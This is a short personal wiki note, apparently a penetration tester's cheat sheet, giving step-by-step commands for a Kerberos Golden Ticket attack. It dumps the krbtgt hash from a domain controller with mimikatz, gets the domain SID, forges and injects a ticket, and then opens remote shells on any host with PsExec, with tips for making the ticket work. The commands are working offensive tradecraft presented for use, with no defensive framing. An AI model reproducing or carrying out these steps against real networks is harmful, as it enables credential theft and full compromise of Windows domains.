Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-11-04T10:37:45-05:00

====== Golden Ticket ======
Created Thursday 04 November 2021

===== Description =====
* A Golden Ticket is a forged TGT that grants an otherwise unprivileged user the access of an admin.

===== Requirements =====
* In order to create such a ticket, you'll need the krbtgt accoun hash

===== Observations =====
* The krbtgt password is not automatically changed
* This  password  is  only  changed  when  the  domain  functional  level  is  upgraded  from Windows  2003  to  Windows  2008.
* Because  of  this,  it  is  not  uncommon  to  find  very  old  krbtgt password hashes


===== Step =====
Get krbtgt by attaining axx as an admin on the domain controller.
Then do this:
{{{code: lang="sh" linenumbers="False"
mimikatz "privilege::debug" "token::elevate" "lsadump::lsa /patch"
}}}


===== Step =====
Obtain the SID 
{{{code: lang="sh" linenumbers="False"
whoami /user
}}}


===== Step =====
Execute this on the host you want to use as your attack platform
{{{code: lang="sh" linenumbers="False"
.\mimikatz.exe "kerberos::golden /user:<username> /domain:<domain> /sid:<sid-rid> /krbtgt:<hash> /ptt" "exit"
}}}

* This will create and insert a golden ticket into  memory

===== Step =====
Now you can do stuff like:
{{{code: lang="sh" linenumbers="False"
PsExec \\<any host at all> cmd
}}}

* You'll need to use a FQDN for the host, to trigger kerberos authentication
* If you specify the IP address, you'll trigger NTLM authentication and the golden ticket won't work
